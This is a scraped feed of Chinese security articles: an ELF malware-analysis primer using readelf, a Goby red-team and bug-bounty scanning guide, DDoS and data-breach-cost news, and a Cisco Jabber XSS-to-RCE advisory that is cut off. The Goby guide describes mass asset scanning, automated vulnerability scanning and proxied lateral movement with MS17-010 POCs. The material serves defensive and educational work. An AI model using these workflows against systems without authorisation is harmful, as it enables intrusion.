-h复查其所有潜在标志，在整篇文章中，我们将使用此命令。</p><p><span style=\"font-size: 20px;\"><strong>符号</strong></span></p><p style=\"text-align: left;\">符号描述了存储在源代码中的数据类型，例如函数和变量，可以将其导出以进行调试和链接。符号可以帮助我们发现开发人员在代码中使用了哪些函数和变量，从而使我们可以更好地了解二进制文件的功能。我们可能还会找到可以在线搜索的唯一函数或变量名称，以确定它是否是已知文件，换句话说，是否有人已经分析过类似的二进制文件，或者这是否是开源工具。</p><p style=\"text-align: left;\">在实践中，我们也会使用readelf命令读取文件的符号。</p><p style=\"text-align: left;\">首先，运行：readelf -s training-sample</p><p style=\"text-align: left;\">你会注意到输出包含两个表：.dynsym和.symtab。 .dynsym表（动态符号表）存在于动态链接和共享的对象文件中。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239248441806.jpeg\" title=\"1598190865464601.jpeg\" alt=\"3.webp.jpg\"/></p><p style=\"text-align: left;\">动态链接的二进制文件使用外部源，例如在运行时存储在操作系统上的libc库。另一方面，将静态链接的二进制文件与这些库一起编译。这意味着静态链接的文件通常比动态链接的文件大。静态链接的文件可能包含大量与库相关的代码，而与实际文件的逻辑无关。</p><p style=\"text-align: left;\">.dynsym表包含动态链接的符号，如libc函数，.symtab表包含源代码中定义的所有符号（包括.dynsym表中的符号）。在上图中，你可以在.dynsym表下看到源代码中使用的libc函数：fgets()，popen()和system()。</p><p style=\"text-align: left;\">符号表可能很长，为简单起见，让我们分别查看每种符号类型。</p><p style=\"text-align: left;\">OBJECT：代码中声明的全局变量。</p><p style=\"text-align: left;\">FUNC：在代码中声明的函数。</p><p style=\"text-align: left;\">FILE：用二进制文件编译的源文件(这是一个调试符号)。如果文件从调试符号中删除，符号表将不包含此类型)。</p><p><span style=\"font-size: 20px;\"><strong>readelf -s training-sample | grep OBJECT</strong></span></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239248212580.jpeg\" title=\"1598190966425525.jpeg\" alt=\"4.webp.jpg\"/></p><p style=\"text-align: left;\">如上图所示，我们可以看到文件的源代码中声明的全局变量。</p><p><span style=\"font-size: 20px;\"><strong>readelf -s training-sample | grep FUNC</strong></span></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239248138387.jpeg\" title=\"1598190976206889.jpeg\" alt=\"5.webp.jpg\"/></p><p style=\"text-align: left;\">我们还可以观察文件源代码中声明的函数以及使用的libc函数，.dynsym和.symtab表中都存在libc函数，这就是为什么我们将它们都列出两次的原因。</p><p><span style=\"font-size: 20px;\"><strong>readelf -s training-sample | grep FILE</strong></span></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239249520433.jpeg\" title=\"1598190985632019.jpeg\" alt=\"6.webp.jpg\"/></p><p style=\"text-align: left;\">用二进制文件编译的源文件是我们的源代码（training_sample.c）和ctrstuff.c文件。 ctrstuff.c源代码在二进制文件内默认编译。它包含用于在文件的主要逻辑之前和之后运行的函数（例如，register_tm_clones，register_tm_clones和frame_dummy）。</p><p style=\"text-align: left;\">通过解析文件的符号，你可以从已编译的样本的源代码中提取标记的函数和变量：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239249438223.jpeg\" title=\"1598190995213877.jpeg\" alt=\"7.webp.jpg\"/></p><p style=\"text-align: left;\">在<a href=\"https://www.intezer.com/blog/elf/executable-linkable-format-101-part-2-symbols/\" target=\"_self\">此处</a>浏览有关符号的更多上下文。</p><p><span style=\"font-size: 20px;\"><strong>段和节（Segments and Sections）</strong></span></p><p style=\"text-align: left;\">定义及其如何帮助我们：</p><p style=\"text-align: left;\">段，也称为程序标头，描述二进制文件的内存布局，它们是执行所必需的。在某些情况下，段表结构中的异常可以帮助我们确定二进制文件是否已被封装，或者文件是否已自我修改（例如文件攻击器）。</p><p style=\"text-align: left;\">段可以分为几个部分，以进行链接和调试。这些部分是程序标题的补充，它们对于文件的执行不是必需的。通常通过节信息检索符号。唯一的段名称可以帮助我们确定不同的编译方法。</p><p style=\"text-align: left;\">运行readelf -l training-sample：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239249835745.jpeg\" title=\"1598191033907315.jpeg\" alt=\"8.webp.jpg\"/></p><p style=\"text-align: left;\">可以看出样本中有9个程序标头（段），每种段类型都描述二进制文件的不同组成部分。本文中，我们将专注于PT_LOAD段。</p><p style=\"text-align: left;\">PT_LOAD段描述了加载到内存中的代码，因此，一个可执行文件应始终至少具有一个PT_LOAD段。在上面的屏幕截图中，你将看到样本包含2个PT_LOAD段。每个段都有不同的标志：</p><p style=\"text-align: left;\">1.RE（读取和执行）标志：这是PT_LOAD段，描述了可执行代码，文件的入口点应位于此段内。</p><p style=\"text-align: left;\">2.RW（读和写）标志：这是PT_LOAD段，其中包含文件的全局变量和动态链接信息。</p><p style=\"text-align: left;\">在段的输出中，我们还会得到一个从段到段的映射列表，其顺序与段表相对应。注意，包含可执行代码指令的.text部分被映射到PT_LOAD R E段，样本的段表结构是“正常”结构的一个示例，如果文件是封装文件或自我修改的文件，我们将看到表的结构不同。</p><p style=\"text-align: left;\">这是封装文件的段表的示例：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239250204956.jpeg\" title=\"1598191044152605.jpeg\" alt=\"9.webp.jpg\"/></p><p style=\"text-align: left;\">该表仅包含3个段：2个PT_LOAD段和一个PT_GNU_STACK。 PT_GNU_STACK的存在向链接器指示文件是否需要可执行堆栈（这也是其大小为零的原因），这不是ELF程序标头表的典型结构。</p><p style=\"text-align: left;\">文件段表中的异常可能是：</p><p style=\"text-align: left;\">1. Segment types and count：该文件仅包含PT_LOAD段（和PT_GNU_STACK）。</p><p style=\"text-align: left;\">2.标志：文件包含具有所有3个标志（RWE）的段。</p><p><span style=\"font-size: 20px;\"><strong>在packer部分中使用这些异常</strong></span></p><p style=\"text-align: left;\">我们将在packer中复查唯一节名称的示例并解析各节，点击<a href=\"https://www.intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/\" target=\"_self\">此处</a>以获取有关ELF段和节的更多信息。</p><p style=\"text-align: left;\">注意：恶意软件开发人员通常会删除或篡改文件的符号或节，使研究人员更难以分析文件。这样几乎不可能调试二进制文件。</p><p style=\"text-align: left;\">以下是开发人员可以用来删除文件符号的方法：</p><p style=\"text-align: left;\">1.运行objcopy -S training-sample training-sample-stripped；</p><p style=\"text-align: left;\">2.运行readelf -s training-sample-stripped，你将看到只有一个动态符号表；</p><p style=\"text-align: left;\">删除工具还可以将节和补丁字段保留在ELF标题中（e_shoff：节标题表的偏移量和e_shnum：节标题的数量）。结果，该二进制文件将被检测为没有任何节。</p><p style=\"text-align: left;\">本文，我们回顾了ELF恶意软件的威胁概况和背景信息，下一篇文章我们将详细介绍具体的静态分析过程。</p>","descriptionType":"text/html","publishedDate":"Thu, 03 Sep 2020 02:16:02 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239246200041.jpeg","linkMd5":"ddc5f53c84d25939a386e5b2bb709c67","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn83@2020_3/2020/09/05/07-31-05-395_e38a79186fbfc507.webp","destWidth":1024,"destHeight":475,"sourceBytes":188340,"destBytes":204136,"author":"xiaohui","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239246200041.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn83@2020_3/2020/09/05/07-31-05-395_e38a79186fbfc507.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239246658866.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn69@2020_1/2020/09/05/07-31-30-933_496c291b2218662e.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239247575040.jpeg":null,"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239247166089.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn63@2020_1/2020/09/05/07-31-26-618_2299aa8540be4c2e.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239248441806.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn71@2020_5/2020/09/05/07-31-23-127_1ce8499ad03441d2.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239248212580.jpeg":null,"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239248138387.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn63@2020_2/2020/09/05/07-31-27-754_b95f501c5f05f768.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239249520433.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn84@2020_1/2020/09/05/07-31-22-496_da1f7cbe4d2a5f28.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239249438223.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn77@2020_1/2020/09/05/07-31-31-319_f41776970cad6469.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239249835745.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn40@2020_2/2020/09/05/07-31-25-255_47e85bd67f67b63e.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239250204956.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn15@2020_4/2020/09/05/07-31-18-466_229297abcdd15769.webp"},"publishedOrCreatedDate":1599291056256},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"技术分享 | Goby食用指南之红蓝对抗","link":"https://www.4hou.com/posts/lDyl","description":"<p style=\"text-align:center\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192113206882.jpeg\" title=\"1599191485388912.jpeg\" alt=\"微信图片_20200904113341.jpg\" width=\"578\" height=\"280\"/></p><p>前言：最近看到好友采用FOFA+Xray组合实现自动挖洞的思路，身为考研选手的我，急了，手中的高等数学瞬间不香了！我寻思着：用Goby联动漏扫他不香吗?不香吗？不香吗？Goby是啥？有了FOFA还用Goby干嘛？Goby可以联动漏扫实现自动挖洞吗？emmm看到好友的疑问三连，我不经陷入沉思，然后百度了下，发现网上介绍Goby的文章也很少，想着马上也要hvv了，于是想写一篇文章来介绍一下我眼中的既能hvv又能联动漏扫挖src的Goby。</p><p><span style=\"font-size: 20px;\"><strong>0x001 我心目中的Goby</strong></span></p><p></p><p>毫无疑问当然是：网络空间测绘。</p><p>我认为FOFA更多是利用白帽汇的服务器资源帮我们进行一个资产的测绘，从互联网上进行爬取（当然Zwell最近发博好像是苦于爬取到某司后台管理系统所造成的的纠纷，看到这条微博，心里喊着：FOFA牛逼，这都能爬到，放开那管理系统，让我xxxx！）</p><p>而相比较FOFA，我认为Goby更多的是利用使用者自己的电脑资源进行一个爬取，与之带来的好处是企业、蓝方也可以对内网的空间进行测绘（如我在学校内网扫学校的B段，扫部分未对公网开放的端口）。但是仅仅只是空间测绘，我了解一下企业网络资产就够了？</p><p><span style=\"font-size: 20px;\"><strong>0x002&#160;食用部分</strong></span></p><p>由于本人在信管处兼职，合法合规的扫描！请大家不要做未授权测试行为！请大家不要做未授权测试行为！请大家不要做未授权测试行为！</p><p><strong>2.1&#160; 资产测绘-信息收集</strong></p><p></p><p>无论是hvv还是src，厂商一般都会给域名，一般也有B段和C段，而Goby对于这部分的信息收集应有尽有：子域名爆破插件+FOFA插件+C段扫描（妈妈再也不用担心我用L工具爆破子域名，再用N工具扫C段了，再用D工具....）</p><p>我的思路：先子域名爆破一波，然后FOFA收集一波，得到的域名和IP，在自己添加B段和C段，直接开整。Goby默认3K的子域名爆破字典，且支持自定义。在线骗一波字典，爽！</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192114106872.jpeg\" title=\"1599191641157087.jpeg\" alt=\"微信图片_20200904113341.jpg\"/></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192114208600.jpeg\" title=\"1599191679223412.jpeg\" alt=\"微信图片_20200904113341.jpg\"/></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192114131061.jpeg\" title=\"1599191700162777.jpeg\" alt=\"微信图片_20200904113341.jpg\"/></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192115890945.png\" title=\"1599191738535300.png\" alt=\"1599191738535300.png\" width=\"640\" height=\"374\"/></p><p></p><p>注：这是去年底在内网扫学校的B段结果。由于是内网，存活也挺多！这里主要是想展示下goby所扫到的：未授权，0708等漏洞。</p><p><strong>2.2&#160; Web视图-手动挡</strong><br/></p><p>由于刚刚资产测绘的同时，基本上把主机漏洞及一些通用漏洞撸顺了一遍。（同时Goby支持自定义POC，基本上那些该有的漏洞都会过了一遍了。）</p><p>我的思路：直接切入web视图，web视图的话（手中的“小米范”瞬间不香了）：首选先看网站title，看着好x的先x一下，如管理系统、后台登录系统等。再看下组件，如java struct 的试试struct 2，也可以看看java组件的请求包里有没有rememberMe（这个可以开发插件解决）。</p><p>最后就是把IP端口导出，交给漏扫自动化。当然也可以先导出IP到漏扫里面，然后一边漏扫自动化，一边xxxx！双线程，牛的！</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192116676381.png\" title=\"1599191836203084.png\" alt=\"1599191836203084.png\" width=\"626\" height=\"424\"/></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192117869203.png\" title=\"1599191850978318.png\" width=\"630\" height=\"390\" alt=\"1599191850978318.png\"/></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192117176581.png\" title=\"1599191854227796.png\" width=\"642\" height=\"489\" alt=\"1599191854227796.png\"/></p><p><strong>2.3&#160; 配合漏扫工具实现自动化</strong></p><p>我的思路：利用上面导出的结果与漏洞扫描器联动。</p><p>1. Xray高级版自动扫！因为如文章开头所说，我同学是FOFA+Xray！</p><p>2. Awvs+Xray，或者360的Craw爬虫等！</p><p>3. Webhook输出和方糖server酱联动实现微信提醒：“漏洞已到账”很香！</p><p>还有很多漏扫的思路，具体网上文章也很多，欢迎大佬们补充。</p><p><span style=\"font-size: 20px;\"><strong>0x003&#160;高级技巧</strong></span></p><p>3.1&#160; 内网横向移动-代理功能</p><p>当红队拿到入口点，内网横向移动的时候，看到网上有的思路是采取msf挂代理扫，其实Goby也可以挂代理扫（自带POC，MS17-010等内网大杀器，以及网站title截图信息手机）。Goby用来做内网横向移动，香！</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192118890292.png\" title=\"1599192029132400.png\" alt=\"图片4.png\" width=\"644\" height=\"177\"/></p><p><strong>3.2&#160; 自定义武器库</strong></p><p>Goby支持自定义POC，可以自定义属于自己的武器库，增强攻击力。随着社区人数的增多，多多贡献插件，一键X卫星再也不是梦！（在线等一个一键X卫星的插件，急！）</p><p></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192118179786.png\" title=\"1599192053112934.png\" width=\"699\" height=\"338\"/></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192119166287.png\" title=\"1599192057230866.png\" width=\"740\" height=\"448\"/></p><p><strong>3.3&#160; 团队协作</strong></p><p>扫描完成之后，扫的结果支持导出导入，避免团队的重复扫描浪费时间。同时可以生成分析报告，并支持PDF、Excel导出，方便本地分析及呈报传阅。</p><p><span style=\"font-size: 20px;\"><strong>0x004&#160;小结</strong></span></p><p><strong>4.1&#160; 红蓝方</strong></p><p>蓝方在前期和红方是一致的，即模拟攻击预演一次。诚然，红方在公网上用Goby扫描到的IP存活远不如蓝方多，但是Goby能够更加清楚全面的对资产进行展示，同时其扫描的数据可以导出，避免团队的重复劳动，又何尝不是个很值得尝试的工具呢！</p><p>分享一下6月初的思路：一个队友负责用Goby扫资产，扫出的结果导出给团队，然后其他人负责分析目标资产，看看网站Title先挑看着软的柿子捏一捏，同时把导出的IP结果导入漏扫碰碰运气（真·碰运气，毕竟公司一般用的商业化的漏扫扫过几轮了）。</p><p><strong>4.2&#160; SRC</strong></p><p>Hvv一般都是给域名、对应的C段和B段，而各大SRC也差不多。信息收集的部分，网上思路千千万万，用Goby试一下如何？</p><p>回到最初的那个点：FOFA+Xray挖洞思路→通过语法从FOFA上面爬取IP，然后交给Xray进行自动化处理。</p><p>我的想法：①Goby里面集成了FOFA插件，不仅可以拿到FOFA数据，还可以对目标资产有更清晰的了解，用了什么架构之类的，通过网站截图和Title看看有哪些站点开放，更可以挑几个软柿子手动档试一试②支持子域名爆破插件，同时可自定义域名、IP段扫描③Fofa都是定期扫描，部分是旧数据，非高级会员能通过API爬取的数据也很少（流下穷人家孩子的眼泪），而Goby是作为我自己主动发起的扫描，是实时的，能爬多少数据就有多少数据。④上述操作一键式，都不需要写脚本。</p><p>上述操作一顿硬怼，Goby+Xray联动好像比FOFA+Xray更香呢？也许你也在眼红看到Xray Team各大src上榜，你为什么不能呢？为什么同样别人能Xray自动化扫到漏洞，你却扫不到呢？那是因为别人收集的资产信息比你多比你全。但是为什么别人能收集到很多信息，你却收集不到呢？Goby，一款你值得尝试并且死忠的信息收集工具！</p><p>上述是我作为蓝方使用Goby的一点小经验，其实也不全是。但相信无论是蓝方还是红方，或者各大挖洞的表哥，Goby对大家而言是一款很实用的网（信）络（息）空（收）间（集）测绘工具。</p><p>写了一手《安全经》送给大家：</p><p>“</p><p>国家安全，企业安全，人民安全</p><p>湖北安全，北京安全，大连安全</p><p>你安全，他安全，我安全</p><p>”</p>","descriptionType":"text/html","publishedDate":"Fri, 04 Sep 2020 06:49:03 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192113206882.jpeg","linkMd5":"04a80f6b7974cfbb572ac23346ea5ec8","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn60@2020_4/2020/09/05/07-30-59-580_2da8446c5e394fd9.webp","destWidth":1080,"destHeight":608,"sourceBytes":72889,"destBytes":61314,"author":"Goby","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192113206882.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn60@2020_4/2020/09/05/07-30-59-580_2da8446c5e394fd9.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192114106872.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn71@2020_3/2020/09/05/07-31-25-022_178982b6a5826b83.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192114208600.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn20@2020_5/2020/09/05/07-31-24-247_a02abbf5277bfd03.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192114131061.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn79@2020_3/2020/09/05/07-31-22-144_4369dd78943d2787.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192115890945.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn31@2020_3/2020/09/05/07-31-24-581_b7b23c6caee580bb.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192116676381.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn55@2020_3/2020/09/05/07-31-25-806_aad5d07261eaa690.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192117869203.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn80@2020_5/2020/09/05/07-31-21-635_99e16a501ba97c97.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192117176581.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn57@2020_6/2020/09/05/07-32-34-081_c3b6eaa8382735ac.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192118890292.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn38@2020_5/2020/09/05/07-31-28-917_900c8967a35800cd.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192118179786.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn75@2020_1/2020/09/05/07-31-22-595_63932e56b3c299d3.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192119166287.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn34@2020_2/2020/09/05/07-31-27-787_d8d808131f4c03f8.webp"},"publishedOrCreatedDate":1599291056253},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"网络攻击瘫痪新西兰股市 360加码政企安全迎战“黑客大玩家”","link":"https://www.4hou.com/posts/0OnX","description":"<p>让股民心塞的不只是股票被套，还有网络攻击。8月25日至8月31日，新西兰证券交易所网站连续5个交易日，因受到黑客攻击而崩溃，交易多次被迫中断。据悉，这是由分布式拒绝服务攻击（DDoS攻击）造成。360方面表示，随着万物互联、全面数字化的提速，大安全时代正在到来，网络攻击已经走进现实。对此，360近期不断加码政企安全，打造了360政企安全集团，以全面守护大安全时代。</p><p>新西兰正在经历11年长牛行情，这次“黑天鹅”事件，颇令股民心塞。“证券行业非常注重IT系统的高可用性，其服务一刻也不能停止，所以，针对证交所的DDoS攻击是最严重的网络攻击行为之一。”&#160;360安全专家魏小强表示。</p><p>何谓DDoS攻击？据魏小强介绍，DDoS攻击是一种恶意的攻击手段，也是互联网上最强大的武器之一，“打个比方，一家正常经营的商场，本来可以正常接待顾客，但是突然来了一伙人，堵在商场门口，不购买东西，却使得正常光顾商场的顾客无法进门，从而使得商场经营瘫痪，最终给商场带来巨大损失。”</p><p>那么，如何应对这种攻击？</p><p>360在应对DDoS攻击上经验丰富。360曾发现全球首个巨型DDoS攻击事件，即一种利用Memcache作为DRDoS放大器进行放大的超大规模DDoS攻击，这种反射型DDoS攻击能够达到5万倍的放大系数，犯罪分子可利用Memcache服务器通过非常少的计算资源发动超大规模的DDoS攻击。</p><p>目前，360在过去多年的实战经验中总结出专门针对DDoS攻击的一整套安全解决方案。</p><p>据魏小强介绍，360新一代网络和安全融合框架——连接云平台，在安全大脑的赋能下，基于零信任技术框架，可以实现协议栈多层防护以及应用隐身保护，使得黑客无法攻击它看不见的东西。该解决方案还可以利用强大的云安全能力，实现对威胁流量的深度检测和安全威胁防范。</p><p>未来，随着万物互联时代来临，人类进入“大安全”时代，不断扩大的物联网(IoT)设备也会越来越多地被黑客攻击，并成为用于提供DDoS攻击的僵尸网络的一部分。</p><p>甚至，某些网络攻击还会演变成物理伤害，影响到工业生产、社会运转以及人们的现实生活中。比如，去年，南美洲国家阿根廷、乌拉圭和巴拉圭大规模停电，正是受到网络攻击影响。</p><p>值得注意的是，网络安全早不是从前杀病毒拦木马的“小时代”，而是“大安全时代”。高度组织化、规模化的“黑客大玩家”，可以通过网络攻击断电断网，也能窃取人民财产安全的情报。</p><p>在此背景下，360利用15年大数据积累与技术积累打造了“安全大脑”，并成立了360政企安全集团，持续加码To B业务，以应对日益复杂的网络攻击，保障网络安全与社会的正常运转。</p><p><br/></p>","descriptionType":"text/html","publishedDate":"Thu, 03 Sep 2020 08:24:02 +0000","feedId":6942,"bgimg":"","linkMd5":"920b3a66d5de4055ca1d1af26fcaaed3","bgimgJsdelivr":"","metaImg":"","author":"高坂穗乃果","publishedOrCreatedDate":1599291056254},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"2020年数据泄露成本报告：全球数据泄露平均总成本为386万美元","link":"https://www.4hou.com/posts/rXW6","description":"<p>每年，我都会撰写有关Ponemon Institute发布的有关数据泄露成本的年度报告，这是一项非常有趣的研究，探讨了“数据泄露”的经济影响。</p><p>今年，研究人员分析了2019年8月至2020年4月期间发生的524起违规事件，涉及17个地区和17个行业的各种规模的组织。</p><p>根据《2020年数据泄露成本报告》，2020年全球数据泄露总成本平均为386万美元，比2019年下降约1.5％。受害者组织发现和控制数据泄露的平均时间为280天，与2019年（279天）相差不多。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200831/1598861336696337.png\" title=\"1598861336696337.png\" alt=\"1.png\"/></p><p>专家还分析了漏洞测试和红队测试对数据泄露成本的影响，发现进行红队测试可以降低平均成本约243,000美元，而进行漏洞测试可以降低成本约173,000美元。</p><p>这份报告首次探讨了远程工作的成本影响和安全技能的短缺。</p><p>IBM在介绍这份报告的文章中写道：具有远程工作安排的组织的数据泄露成本比全球平均水平386万美元高出近13.7万美元，而据组织估计，安全技能短缺导致的成本平均比全球平均水平增加了25.7万美元。</p><p>该报告第一次根据所涉及的记录类型深入分析数据泄露的每条记录成本。专家指出，客户个人身份信息（PII）是最昂贵的记录信息。客户PII记录每条丢失或被盗的平均成本为150美元，其次是知识产权记录（147美元），匿名客户记录（143美元）或员工PII（141美元）。不幸的是，在分析的事件中，80%都存在客户PII。</p><p>2020年观察到的52％的数据泄露是由恶意攻击引起的。</p><p>对攻击媒介的分析表明，最突出的是泄露的凭证（19%的恶意破坏），云配置错误（占19％）和第三方软件中的漏洞（占16％）。</p><p>该报告首次分析了涉及破坏性恶意软件的破坏的成本，专家估计平均破坏性恶意软件的破坏成本为452万美元，平均勒索软件破坏的成本为444万美元。恶意破坏的平均总费用为427万美元。</p><p>您可以使用与本年度报告配套的交互式成本计算器，探索这些成本因素以及其他因素的影响，其中一些因素增加了成本，另一些因素降低了成本。您可以注册使用完整的计算器，以查看25个成本因素对17个地区和14个行业中数据泄露的平均成本的估计影响。</p><p>2020年数据泄露成本报告的另一个新颖之处在于基于攻击者类型的数据泄露分析。</p><p>大多数恶意破坏是由出于经济动机的威胁参与者（53％）引起的，其次是民族国家参与者（13％）和黑客主义者威胁参与者（13％）。根据专家的说法，根据专家们的说法，国家资助的违规行为（443万美元）和黑客行为主义者的违规行为（428万美元）的平均成本高于出于经济动机的违规行为（423万美元）。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200831/1598861365109265.png\" title=\"1598861365109265.png\" alt=\"2.png\"/></p><p>完整的报告可<a href=\"https://www.ibm.com/security/digital-assets/cost-data-breach-report/#/zh\" target=\"_blank\" title=\"https://www.ibm.com/security/digital-assets/cost-data-breach-report/#/zh\">在此处</a>获得。</p>","descriptionType":"text/html","publishedDate":"Thu, 03 Sep 2020 02:20:00 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200831/1598861336696337.png","linkMd5":"172e18230e5902bab7e2e0aa682bcb05","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn72@2020_1/2020/09/05/07-31-14-040_7df9428037122aae.webp","destWidth":665,"destHeight":327,"sourceBytes":33446,"destBytes":18390,"author":"walker","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200831/1598861336696337.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn72@2020_1/2020/09/05/07-31-14-040_7df9428037122aae.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200831/1598861365109265.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn36@2020_4/2020/09/05/07-31-20-129_41d42fd7e82a1eb5.webp"},"publishedOrCreatedDate":1599291056254},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"Cisco Jabber多安全漏洞，可远程攻击Windows系统","link":"https://www.4hou.com/posts/jLw5","description":"<p>Cisco Jabber是一款思科开发的协同应用程序，可以提供企业级的商务视频会议、即时消息、语音、语音留言和视频呼叫等功能，兼容Jabber Server。近日，思科发布了新的Jabber Windows版本，其中修复了多个安全漏洞。未经认证的远程攻击者利用这些安全漏洞可以实现任意代码执行。<br/></p><p><span style=\"font-size: 20px;\"><strong>漏洞概述</strong></span></p><p>Watchcom的安全研究人员在一次渗透测试中发现了影响Jabber 客户端 (v12.1-12.9)版本的4个安全漏洞，分别是CVE-2020-3495、CVE-2020-3430、CVE-2020-3498、CVE-2020-3537。其中2个漏洞可以通过在群聊或特定个人的聊天中发送精心伪造的聊天消息来实现远程代码执行。</p><p>其中最严重的漏洞为CVE-2020-3495，CVSS评分为 9.9分，是由于消息内容未合理验证导致的，攻击者可以通过发送伪造的恶意XMPP消息到受影响的软件来利用该漏洞。成功利用该漏洞可以使得该应用在目标系统上以Cisco Jabber客户端软件运行的用户账户权限执行任意程序，可能会引发任意代码执行。</p><p><span style=\"font-size: 20px;\"><strong>从XSS到RCE</strong></span></p><p>XMPP (Jabber) 是一个基于XML的通信协议，用于2个及以上网络实体之间的即时消息。XMPP设计指出就考虑了如何扩展额外的功能，其中XEP-0071: XHTML-IM就是使用XMPP协议交换HTML 内容。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599133209630949.png\" title=\"1599133038206120.png\" alt=\"image.png\"/>含有明文和HTML消息的XMPP消息</p><p>Cisco Jabber中的漏洞是源于分析XHTML-IM消息时引发的XSS漏洞，应用没有对进入的HTML消息就行适当处理，而是用有漏洞的XSS&#160;过滤器进行行分析。因此，合法的XMPP消息就可以被拦截和修改，引发应用运行应用所在本地文件路径中的任意可执行文件。</p><p style=\"text-align: center;\"><img 